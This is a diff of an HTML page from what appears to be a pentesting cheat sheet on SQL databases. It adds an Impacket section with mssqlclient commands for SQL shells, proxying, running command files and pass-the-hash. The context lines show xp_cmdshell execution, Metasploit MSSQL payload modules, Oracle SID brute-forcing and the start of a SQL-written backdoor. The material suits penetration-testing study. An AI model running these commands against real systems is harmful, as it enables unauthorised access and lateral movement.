@@ -44,7 +44,7 @@
 <meta itemprop="name" content="SQL">
 <meta itemprop="description" content="General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Bad character detect Authen bypass Sql injection bypass filter   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql -host=TARGETIP -u root -p mysql -u root -p password -e &#39;show databases;&#39; mysql -u root -p password DBNAME -e &#39;select * from TABLENAME;&#39; Access Locally: mysql -u root -p mysql&gt; use DBNAME; mysql&gt; show tables; Command Backdoor example: SELECT &#34;&lt;?"><meta itemprop="datePublished" content="2021-06-08T00:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2021-06-08T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="1854"><meta itemprop="image" content="https://pbs.twimg.com/profile_images/1390346481970802689/qMVDRriV_400x400.jpg"/>
+<meta itemprop="wordCount" content="1915"><meta itemprop="image" content="https://pbs.twimg.com/profile_images/1390346481970802689/qMVDRriV_400x400.jpg"/>
 <meta itemprop="keywords" content="web,infosec," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://pbs.twimg.com/profile_images/1390346481970802689/qMVDRriV_400x400.jpg"/>
@@ -220,14 +220,27 @@ port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1433</span
 tds version <span style="color:#f92672">=</span> 8.0
 </code></pre></div><p>Edit .sqshrc<br>
 <code>\set style=vert</code><br>
-Connect to the database:\</p>
+Connect to the database:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqsh -S SERVERNAME -U USER -P PASSWORD
 &gt;exec xp_cmdshell <span style="color:#e6db74">&#39;whoami&#39;</span>
 &gt;go
 </code></pre></div><p>Metasploit:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">use auxiliary/scanner/mssql/mssql_login
 use exploit/windows/mssql/mssql_payload
-</code></pre></div><h2 id="oracle-1521">Oracle-1521</h2>
+</code></pre></div><h4 id="impacket">Impacket.</h4>
+<p>Get SQL Shell<br>
+<code>mssqlclient.exe quabbles/sqladmin@192.168.3.73 -windows-auth</code><br>
+Using proxy<br>
+<code>proxychains python mssqlclient.py quabbles/sqladmin@192.168.x.x -windows-auth</code><br>
+Run mssql.txt file when authen success (mssql account)<br>
+<code>proxychains python mssqlclient.py ./sa:admin@192.168.x.x -file mssql.txt</code><br>
+Run mssql.txt file when authen success (win authen)<br>
+<code>proxychains python mssqlclient.py -p 1433 quabbles/sqladmin:123456@192.168.x.x -windows-auth -file cpmmand.txt</code><br>
+Can using PTH if can<br>
+<code>mssqlclient.exe -p 1433 -hashes :&quot;hash&quot; quabbles/sqladmin@192.168.x.x -file command.txt -windows-auth</code><br>
+<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py</a>
+<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
+<h2 id="oracle-1521">Oracle-1521</h2>
 <h4 id="nmap-2">Nmap:</h4>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sV -Pn -p <span style="color:#ae81ff">1521</span> --script<span style="color:#f92672">=</span>oracle-sid-brute TARGETIP
 nmap -sV -Pn -p <span style="color:#ae81ff">1521</span> --script<span style="color:#f92672">=</span>oracle-enum-users --script-args sid<span style="color:#f92672">=</span>ORCL,userdb<span style="color:#f92672">=</span>users.txt TARGETIP
@@ -779,7 +792,7 @@ sqlmap -r login-chris.request --level <span style="color:#ae81ff">5</span> --ris
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1854 Words
+        1915 Words
       </p>
 
       <p>
